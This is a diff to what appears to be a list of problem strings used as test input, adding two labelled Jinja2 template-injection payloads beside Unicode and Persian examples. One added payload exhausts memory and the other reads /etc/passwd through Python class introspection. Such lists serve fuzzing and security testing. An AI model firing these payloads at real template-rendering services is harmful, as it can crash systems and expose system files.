@@ -731,3 +731,11 @@ Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗
 # This is a four characters string which includes Persian special characters (گچپژ)
 
 گچپژ
+
+# jinja2 injection
+#
+# first one is supposed to raise "MemoryError" exception
+# second, obviously, prints contents of /etc/passwd
+
+{% print 'x' * 64 * 1024**3 %}
+{{ "".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
